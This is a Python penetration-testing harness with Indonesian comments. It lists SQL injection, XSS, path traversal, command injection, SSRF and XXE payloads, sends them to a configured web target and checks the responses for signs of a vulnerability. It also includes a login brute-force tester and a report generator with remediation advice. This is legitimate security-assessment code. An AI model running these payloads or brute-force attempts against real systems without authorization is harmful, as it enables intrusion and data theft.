#!/usr/bin/env python3
"""
Module: penetration_testing_harness.py
Layer: Security Hardening

Responsibility:
    Harness untuk penetration testing dan security assessment otomatis.
    Mendukung simulasi serangan umum (SQL injection, XSS, CSRF, brute force,
    privilege escalation, path traversal, command injection, SSRF, XXE, dll).

Metode yang ditambahkan:
- Untuk TestResult: validate, to_dict, from_dict, clone, snapshot, version, audit_trail, touch.
- Untuk TestConfig: validate, to_dict, from_dict, clone, snapshot, version, audit_trail, touch.
- Untuk PenetrationTestingHarness: validate, to_dict, from_dict, clone, snapshot, version, audit_trail, touch.
"""

from __future__ import annotations

import json
import logging
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import Enum
from typing import Any

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


# ============================================================================
# Enums
# ============================================================================
class AttackType(Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "cross_site_scripting"
    CSRF = "cross_site_request_forgery"
    BRUTE_FORCE = "brute_force"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    SSRF = "server_side_request_forgery"
    XXE = "xml_external_entity"
    RATE_LIMIT = "rate_limit"
    JWT_VULNERABILITY = "jwt_vulnerability"

    def display_name(self) -> str:
        names = {
            AttackType.SQL_INJECTION: "SQL Injection",
            AttackType.XSS: "Cross-Site Scripting",
            AttackType.CSRF: "Cross-Site Request Forgery",
            AttackType.BRUTE_FORCE: "Brute Force",
            AttackType.PRIVILEGE_ESCALATION: "Privilege Escalation",
            AttackType.PATH_TRAVERSAL: "Path Traversal",
            AttackType.COMMAND_INJECTION: "Command Injection",
            AttackType.SSRF: "Server-Side Request Forgery",
            AttackType.XXE: "XML External Entity",
            AttackType.RATE_LIMIT: "Rate Limiting",
            AttackType.JWT_VULNERABILITY: "JWT Vulnerability",
        }
        return names.get(self, self.value)


class VulnerabilitySeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

    def display_name(self) -> str:
        names = {
            VulnerabilitySeverity.CRITICAL: "Kritis",
            VulnerabilitySeverity.HIGH: "Tinggi",
            VulnerabilitySeverity.MEDIUM: "Sedang",
            VulnerabilitySeverity.LOW: "Rendah",
            VulnerabilitySeverity.INFO: "Informasi",
        }
        return names.get(self, self.value)


class TestStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    VULNERABLE = "vulnerable"
    NOT_VULNERABLE = "not_vulnerable"


# ============================================================================
# Payload Collections
# ============================================================================
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' AND SLEEP(5)--",
    "' UNION SELECT NULL, username, password FROM users--",
    "admin' --",
    "1' OR '1' = '1'",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR 1=1 --",
    "'; EXEC xp_cmdshell('dir') --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('XSS')",
    '"><script>alert(1)</script>',
    "<svg onload=alert(1)>",
    "';alert('XSS');//",
    "<body onload=alert(1)>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "....//....//....//etc/passwd",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls",
    "| dir",
    "`id`",
    "$(id)",
    "& ping -c 1 127.0.0.1",
    "|| cat /etc/passwd",
    "`cat /etc/passwd`",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:22",
    "file:///etc/passwd",
    "gopher://localhost:8080",
]

XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]><root>%xxe;</root>""",
]


# ============================================================================
# Data Classes
# ============================================================================
@dataclass(kw_only=True)
class TestResult:
    attack_type: AttackType
    target: str
    status: TestStatus
    severity: VulnerabilitySeverity
    details: str
    payload: str | None = None
    response_time_ms: float | None = None
    evidence: str | None = None
    remediation: str | None = None
    timestamp: datetime = field(default_factory=lambda: datetime.now(UTC))

    # Fields untuk audit
    _audit_trail: list[dict[str, Any]] = field(default_factory=list, repr=False)
    _snapshots: list[dict[str, Any]] = field(default_factory=list, repr=False)
    _version: int = 1

    def __post_init__(self):
        self._take_snapshot()

    def _take_snapshot(self):
        self._snapshots.append(
            {
                "version": self._version,
                "attack_type": self.attack_type.value,
                "target": self.target,
                "status": self.status.value,
                "severity": self.severity.value,
                "timestamp": datetime.now(UTC).isoformat(),
            }
        )
        if len(self._snapshots) > 10:
            self._snapshots.pop(0)

    def _record_audit(self, action: str, performed_by: str, details: dict[str, Any]):
        self._audit_trail.append(
            {
                "action": action,
                "performed_by": performed_by,
                "timestamp": datetime.now(UTC).isoformat(),
                "version": self._version,
                "details": details,
            }
        )

    # ==================== ENTITY DASAR METHODS ====================
    def validate(self) -> dict[str, Any]:
        errors = []
        if not isinstance(self.attack_type, AttackType):
            errors.append("Invalid attack_type")
        if not self.target:
            errors.append("Target is required")
        if not isinstance(self.status, TestStatus):
            errors.append("Invalid status")
        if not isinstance(self.severity, VulnerabilitySeverity):
            errors.append("Invalid severity")
        return {"is_valid": len(errors) == 0, "errors": errors}

    def to_dict(self) -> dict[str, Any]:
        return {
            "attack_type": self.attack_type.value,
            "target": self.target,
            "status": self.status.value,
            "severity": self.severity.value,
            "details": self.details,
            "payload": self.payload,
            "response_time_ms": self.response_time_ms,
            "evidence": self.evidence[:500] if self.evidence else None,
            "remediation": self.remediation,
            "timestamp": self.timestamp.isoformat(),
            "version": self._version,
        }

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> TestResult:
        instance = cls(
            attack_type=AttackType(data["attack_type"]),
            target=data["target"],
            status=TestStatus(data["status"]),
            severity=VulnerabilitySeverity(data["severity"]),
            details=data["details"],
            payload=data.get("payload"),
            response_time_ms=data.get("response_time_ms"),
            evidence=data.get("evidence"),
            remediation=data.get("remediation"),
            timestamp=datetime.fromisoformat(data["timestamp"]),
        )
        instance._version = data.get("version", 1)
        return instance

    def clone(self) -> TestResult:
        new = TestResult(
            attack_type=self.attack_type,
            target=self.target,
            status=self.status,
            severity=self.severity,
            details=self.details,
            payload=self.payload,
            response_time_ms=self.response_time_ms,
            evidence=self.evidence,
            remediation=self.remediation,
            timestamp=datetime.now(UTC),
        )
        new._version = self._version + 1
        return new

    def snapshot(self) -> dict[str, Any]:
        return {
            "version": self._version,
            "attack_type": self.attack_type.value,
            "target": self.target,
            "status": self.status.value,
            "severity": self.severity.value,
            "timestamp": self.timestamp.isoformat(),
        }

    def version(self) -> int:
        return self._version

    def audit_trail(self, limit: int = 100) -> list[dict[str, Any]]:
        return self._audit_trail[-limit:]

    def touch(self, touched_by: str) -> TestResult:
        self._version += 1
        self._record_audit("TOUCH", touched_by, {})
        return self


@dataclass(kw_only=True)
class TestConfig:
    target_url: str
    api_key: str | None = None
    auth_token: str | None = None
    cookies: dict | None = None
    headers: dict | None = None
    timeout: int = 30
    max_concurrent: int = 5
    rate_limit_delay: float = 0.1

    # Fields untuk audit
    _audit_trail: list[dict[str, Any]] = field(default_factory=list, repr=False)
    _snapshots: list[dict[str, Any]] = field(default_factory=list, repr=False)
    _version: int = 1

    def __post_init__(self):
        self._take_snapshot()

    def _take_snapshot(self):
        self._snapshots.append(
            {
                "version": self._version,
                "target_url": self.target_url,
                "timeout": self.timeout,
                "max_concurrent": self.max_concurrent,
                "timestamp": datetime.now(UTC).isoformat(),
            }
        )
        if len(self._snapshots) > 10:
            self._snapshots.pop(0)

    def _record_audit(self, action: str, performed_by: str, details: dict[str, Any]):
        self._audit_trail.append(
            {
                "action": action,
                "performed_by": performed_by,
                "timestamp": datetime.now(UTC).isoformat(),
                "version": self._version,
                "details": details,
            }
        )

    # ==================== ENTITY DASAR METHODS ====================
    def validate(self) -> dict[str, Any]:
        errors = []
        if not self.target_url:
            errors.append("target_url is required")
        if self.timeout <= 0:
            errors.append("timeout must be positive")
        if self.max_concurrent <= 0:
            errors.append("max_concurrent must be positive")
        if self.rate_limit_delay < 0:
            errors.append("rate_limit_delay cannot be negative")
        return {"is_valid": len(errors) == 0, "errors": errors}

    def to_dict(self) -> dict[str, Any]:
        return {
            "target_url": self.target_url,
            "api_key": "***REDACTED***" if self.api_key else None,
            "auth_token": "***REDACTED***" if self.auth_token else None,
            "cookies": self.cookies,
            "headers": dict.fromkeys(self.headers, "***REDACTED***") if self.headers else None,
            "timeout": self.timeout,
            "max_concurrent": self.max_concurrent,
            "rate_limit_delay": self.rate_limit_delay,
            "version": self._version,
        }

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> TestConfig:
        instance = cls(
            target_url=data["target_url"],
            api_key=data.get("api_key"),
            auth_token=data.get("auth_token"),
            cookies=data.get("cookies"),
            headers=data.get("headers"),
            timeout=data.get("timeout", 30),
            max_concurrent=data.get("max_concurrent", 5),
            rate_limit_delay=data.get("rate_limit_delay", 0.1),
        )
        instance._version = data.get("version", 1)
        return instance

    def clone(self) -> TestConfig:
        new = TestConfig(
            target_url=self.target_url,
            api_key=self.api_key,
            auth_token=self.auth_token,
            cookies=self.cookies.copy() if self.cookies else None,
            headers=self.headers.copy() if self.headers else None,
            timeout=self.timeout,
            max_concurrent=self.max_concurrent,
            rate_limit_delay=self.rate_limit_delay,
        )
        new._version = self._version + 1
        return new

    def snapshot(self) -> dict[str, Any]:
        return {
            "version": self._version,
            "target_url": self.target_url,
            "timeout": self.timeout,
            "max_concurrent": self.max_concurrent,
            "timestamp": datetime.now(UTC).isoformat(),
        }

    def version(self) -> int:
        return self._version

    def audit_trail(self, limit: int = 100) -> list[dict[str, Any]]:
        return self._audit_trail[-limit:]

    def touch(self, touched_by: str) -> TestConfig:
        self._version += 1
        self._record_audit("TOUCH", touched_by, {})
        return self


# ============================================================================
# PenetrationTestingHarness Core
# ============================================================================
class PenetrationTestingHarness:
    """
    Harness untuk penetration testing endpoint aplikasi.
    """

    def __init__(self, config: TestConfig):
        if not HAS_REQUESTS:
            raise ImportError("requests library is required for penetration testing")
        self.config = config
        self.results: list[TestResult] = []
        self._session = self._create_session()
        self._lock = threading.RLock()
        self._version = 1
        self._audit_trail: list[dict[str, Any]] = []
        self._snapshots: list[dict[str, Any]] = []
        self._take_snapshot()

    def _take_snapshot(self):
        self._snapshots.append(
            {
                "version": self._version,
                "target_url": self.config.target_url,
                "results_count": len(self.results),
                "timestamp": datetime.now(UTC).isoformat(),
            }
        )
        if len(self._snapshots) > 10:
            self._snapshots.pop(0)

    def _record_audit(self, action: str, performed_by: str, details: dict[str, Any]):
        self._audit_trail.append(
            {
                "action": action,
                "performed_by": performed_by,
                "timestamp": datetime.now(UTC).isoformat(),
                "version": self._version,
                "details": details,
            }
        )

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        if self.config.headers:
            session.headers.update(self.config.headers)
        if self.config.cookies:
            session.cookies.update(self.config.cookies)
        if self.config.auth_token:
            session.headers.update({"Authorization": f"Bearer {self.config.auth_token}"})
        if self.config.api_key:
            session.headers.update({"X-API-Key": self.config.api_key})
        return session

    def _request(
        self, endpoint: str, method: str = "GET", data: dict = None, params: dict = None
    ) -> tuple[int, str, float]:
        url = self.config.target_url.rstrip("/") + "/" + endpoint.lstrip("/")
        start = time.time()
        try:
            if method.upper() == "GET":
                resp = self._session.get(url, params=params, timeout=self.config.timeout)
            elif method.upper() == "POST":
                resp = self._session.post(
                    url, json=data, params=params, timeout=self.config.timeout
                )
            else:
                resp = self._session.request(
                    method, url, json=data, params=params, timeout=self.config.timeout
                )
            duration = (time.time() - start) * 1000
            return resp.status_code, resp.text[:5000], duration
        except requests.exceptions.Timeout:
            logger.warning(f"Request timeout to {url}")
            return 408, "Timeout", (time.time() - start) * 1000
        except Exception as e:
            logger.warning(f"Request error to {url}: {e}")
            return 500, str(e), (time.time() - start) * 1000

    # ------------------------------------------------------------------------
    # Individual Attack Tests
    # ------------------------------------------------------------------------
    def test_sql_injection(self, endpoint: str, param: str, method: str = "GET") -> TestResult:
        for payload in SQL_INJECTION_PAYLOADS:
            params = {param: payload} if method.upper() == "GET" else None
            data = {param: payload} if method.upper() == "POST" else None
            status, body, duration = self._request(endpoint, method, data=data, params=params)
            indicators = [
                "sql syntax",
                "mysql_fetch",
                "ORA-",
                "PostgreSQL",
                "SQLite",
                "unclosed quotation",
                "Microsoft OLE DB",
                "syntax error",
            ]
            for ind in indicators:
                if ind.lower() in body.lower():
                    return TestResult(
                        attack_type=AttackType.SQL_INJECTION,
                        target=f"{endpoint}?{param}={payload}",
                        status=TestStatus.VULNERABLE,
                        severity=VulnerabilitySeverity.CRITICAL,
                        details=f"SQL injection detected with payload: {payload}. Error indicator: {ind}",
                        payload=payload,
                        response_time_ms=duration,
                        evidence=body[:500],
                        remediation="Use parameterized queries/prepared statements",
                    )
        return TestResult(
            attack_type=AttackType.SQL_INJECTION,
            target=endpoint,
            status=TestStatus.NOT_VULNERABLE,
            severity=VulnerabilitySeverity.INFO,
            details="No SQL injection vulnerability detected",
        )

    def test_xss(self, endpoint: str, param: str, method: str = "GET") -> TestResult:
        for payload in XSS_PAYLOADS:
            params = {param: payload} if method.upper() == "GET" else None
            data = {param: payload} if method.upper() == "POST" else None
            status, body, duration = self._request(endpoint, method, data=data, params=params)
            if payload in body:
                return TestResult(
                    attack_type=AttackType.XSS,
                    target=f"{endpoint}?{param}={payload}",
                    status=TestStatus.VULNERABLE,
                    severity=VulnerabilitySeverity.HIGH,
                    details="XSS vulnerability detected. Payload reflected in response.",
                    payload=payload,
                    response_time_ms=duration,
                    evidence="Payload found in response",
                    remediation="Encode output contextually; use CSP headers",
                )
        return TestResult(
            attack_type=AttackType.XSS,
            target=endpoint,
            status=TestStatus.NOT_VULNERABLE,
            severity=VulnerabilitySeverity.INFO,
            details="No XSS vulnerability detected",
        )

    def test_path_traversal(self, endpoint: str, param: str, method: str = "GET") -> TestResult:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            params = {param: payload} if method.upper() == "GET" else None
            data = {param: payload} if method.upper() == "POST" else None
            status, body, duration = self._request(endpoint, method, data=data, params=params)
            indicators = ["root:", "daemon:", "bin:", "[extensions]", "[fonts]"]
            for ind in indicators:
                if ind in body:
                    return TestResult(
                        attack_type=AttackType.PATH_TRAVERSAL,
                        target=f"{endpoint}?{param}={payload}",
                        status=TestStatus.VULNERABLE,
                        severity=VulnerabilitySeverity.HIGH,
                        details="Path traversal detected. File content exposed.",
                        payload=payload,
                        response_time_ms=duration,
                        evidence=body[:500],
                        remediation="Validate and sanitize file paths; use allowlist",
                    )
        return TestResult(
            attack_type=AttackType.PATH_TRAVERSAL,
            target=endpoint,
            status=TestStatus.NOT_VULNERABLE,
            severity=VulnerabilitySeverity.INFO,
            details="No path traversal vulnerability detected",
        )

    def test_command_injection(self, endpoint: str, param: str, method: str = "GET") -> TestResult:
        for payload in COMMAND_INJECTION_PAYLOADS:
            params = {param: payload} if method.upper() == "GET" else None
            data = {param: payload} if method.upper() == "POST" else None
            status, body, duration = self._request(endpoint, method, data=data, params=params)
            if "uid=" in body or "gid=" in body or "root" in body:
                return TestResult(
                    attack_type=AttackType.COMMAND_INJECTION,
                    target=f"{endpoint}?{param}={payload}",
                    status=TestStatus.VULNERABLE,
                    severity=VulnerabilitySeverity.CRITICAL,
                    details="Command injection detected",
                    payload=payload,
                    response_time_ms=duration,
                    remediation="Avoid system calls; use allowlist for inputs",
                )
        return TestResult(
            attack_type=AttackType.COMMAND_INJECTION,
            target=endpoint,
            status=TestStatus.NOT_VULNERABLE,
            severity=VulnerabilitySeverity.INFO,
            details="No command injection vulnerability detected",
        )

    def test_ssrf(self, endpoint: str, param: str, method: str = "GET") -> TestResult:
        for payload in SSRF_PAYLOADS:
            params = {param: payload} if method.upper() == "GET" else None
            data = {param: payload} if method.upper() == "POST" else None
            status, body, duration = self._request(endpoint, method, data=data, params=params)
            if "instance-id" in body.lower() or "ami-id" in body.lower():
                return TestResult(
                    attack_type=AttackType.SSRF,
                    target=f"{endpoint}?{param}={payload}",
                    status=TestStatus.VULNERABLE,
                    severity=VulnerabilitySeverity.CRITICAL,
                    details="SSRF to cloud metadata service detected",
                    payload=payload,
                    response_time_ms=duration,
                    remediation="Block internal IP ranges; validate URL schemes",
                )
        return TestResult(
            attack_type=AttackType.SSRF,
            target=endpoint,
            status=TestStatus.NOT_VULNERABLE,
            severity=VulnerabilitySeverity.INFO,
            details="No SSRF vulnerability detected",
        )

    def test_brute_force(
        self,
        login_endpoint: str,
        username_field: str,
        password_field: str,
        username: str,
        password_list: list[str],
    ) -> TestResult:
        start_time = time.time()
        attempts = 0
        for pwd in password_list[:20]:
            data = {username_field: username, password_field: pwd}
            status, body, duration = self._request(login_endpoint, "POST", data=data)
            attempts += 1
            if "login successful" in body.lower() or "redirect" in body.lower():
                return TestResult(
                    attack_type=AttackType.BRUTE_FORCE,
                    target=login_endpoint,
                    status=TestStatus.VULNERABLE,
                    severity=VulnerabilitySeverity.HIGH,
                    details=f"Brute force possible. Password '{pwd}' worked.",
                    payload=pwd,
                    response_time_ms=duration,
                    remediation="Implement rate limiting, CAPTCHA, account lockout",
                )
            time.sleep(self.config.rate_limit_delay)
        duration_total = time.time() - start_time
        if attempts > 5 and duration_total < 10:
            return TestResult(
                attack_type=AttackType.RATE_LIMIT,
                target=login_endpoint,
                status=TestStatus.VULNERABLE,
                severity=VulnerabilitySeverity.MEDIUM,
                details=f"No rate limiting detected. {attempts} attempts in {duration_total:.1f}s",
                remediation="Implement rate limiting per IP/user",
            )
        return TestResult(
            attack_type=AttackType.BRUTE_FORCE,
            target=login_endpoint,
            status=TestStatus.NOT_VULNERABLE,
            severity=VulnerabilitySeverity.INFO,
            details="Brute force seems protected (rate limiting or lockout)",
        )

    # ------------------------------------------------------------------------
    # Bulk Testing
    # ------------------------------------------------------------------------
    def test_endpoint_parameters(
        self, endpoint: str, params: list[str], method: str = "GET"
    ) -> list[TestResult]:
        results = []
        for param in params:
            results.append(self.test_sql_injection(endpoint, param, method))
            results.append(self.test_xss(endpoint, param, method))
            results.append(self.test_path_traversal(endpoint, param, method))
            results.append(self.test_command_injection(endpoint, param, method))
            results.append(self.test_ssrf(endpoint, param, method))
        return results

    def run_full_scan(self, endpoints: dict[str, dict]) -> list[TestResult]:
        all_results = []
        with ThreadPoolExecutor(max_workers=self.config.max_concurrent) as executor:
            futures = []
            for path, config in endpoints.items():
                for param in config.get("params", []):
                    method = config.get("method", "GET")
                    futures.append(executor.submit(self.test_sql_injection, path, param, method))
                    futures.append(executor.submit(self.test_xss, path, param, method))
                    futures.append(executor.submit(self.test_path_traversal, path, param, method))
                    futures.append(
                        executor.submit(self.test_command_injection, path, param, method)
                    )
                    futures.append(executor.submit(self.test_ssrf, path, param, method))
            for future in as_completed(futures):
                all_results.append(future.result())
        with self._lock:
            self.results.extend(all_results)
        self._record_audit("RUN_FULL_SCAN", "system", {"endpoints_count": len(endpoints)})
        return all_results

    # ------------------------------------------------------------------------
    # Reporting
    # ------------------------------------------------------------------------
    def generate_report(self) -> dict:
        total = len(self.results)
        vulnerable = [r for r in self.results if r.status == TestStatus.VULNERABLE]
        not_vulnerable = [r for r in self.results if r.status == TestStatus.NOT_VULNERABLE]
        by_severity = {sev.value: 0 for sev in VulnerabilitySeverity}
        for r in vulnerable:
            by_severity[r.severity.value] = by_severity.get(r.severity.value, 0) + 1
        return {
            "target": self.config.target_url,
            "scan_time": datetime.now(UTC).isoformat(),
            "total_tests": total,
            "vulnerabilities_found": len(vulnerable),
            "by_severity": by_severity,
            "vulnerabilities": [r.to_dict() for r in vulnerable],
            "summary": f"Found {len(vulnerable)} vulnerabilities ({len(vulnerable)}/{total} tests)",
            "recommendations": list(set([r.remediation for r in vulnerable if r.remediation])),
            "version": self._version,
        }

    def export_to_json(self, file_path: str) -> None:
        with open(file_path, "w") as f:
            json.dump(self.generate_report(), f, indent=2, default=str)

    # ==================== ENTITY DASAR METHODS ====================
    def validate(self) -> dict[str, Any]:
        errors = []
        res = self.config.validate()
        if not res["is_valid"]:
            errors.extend([f"Config: {e}" for e in res["errors"]])
        for r in self.results:
            res = r.validate()
            if not res["is_valid"]:
                errors.extend([f"Result: {e}" for e in res["errors"]])
        return {"is_valid": len(errors) == 0, "errors": errors}

    def to_dict(self) -> dict[str, Any]:
        return {
            "config": self.config.to_dict(),
            "results_count": len(self.results),
            "version": self._version,
        }

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> PenetrationTestingHarness:
        config = TestConfig.from_dict(data["config"])
        instance = cls(config)
        instance._version = data.get("version", 1)
        # Results tidak bisa direstore karena harus re-run
        return instance

    def clone(self) -> PenetrationTestingHarness:
        new = PenetrationTestingHarness(self.config.clone())
        new._version = self._version + 1
        return new

    def snapshot(self) -> dict[str, Any]:
        return {
            "version": self._version,
            "target_url": self.config.target_url,
            "results_count": len(self.results),
            "timestamp": datetime.now(UTC).isoformat(),
        }

    def version(self) -> int:
        return self._version

    def audit_trail(self, limit: int = 100) -> list[dict[str, Any]]:
        return self._audit_trail[-limit:]

    def touch(self, touched_by: str) -> PenetrationTestingHarness:
        self._version += 1
        self._record_audit("TOUCH", touched_by, {})
        return self

    def reset(self) -> None:
        self.results.clear()
        self._version = 1
        self._audit_trail = []
        self._snapshots = []
        self._record_audit("RESET", "system", {})


# ============================================================================
# Demo
# ============================================================================
if __name__ == "__main__":
    config = TestConfig(target_url="https://test-app.example.com/api")
    harness = PenetrationTestingHarness(config)

    result = harness.test_sql_injection("/users", "id", "GET")
    print(f"SQL Injection test: {result.status.value} - {result.details}")

    endpoints = {
        "/login": {"method": "POST", "params": ["username", "password"]},
        "/user/profile": {"method": "GET", "params": ["user_id"]},
    }
    results = harness.run_full_scan(endpoints)
    report = harness.generate_report()
    print(json.dumps(report, indent=2))
    harness.export_to_json("pentest_report.json")
    print("Report saved to pentest_report.json")
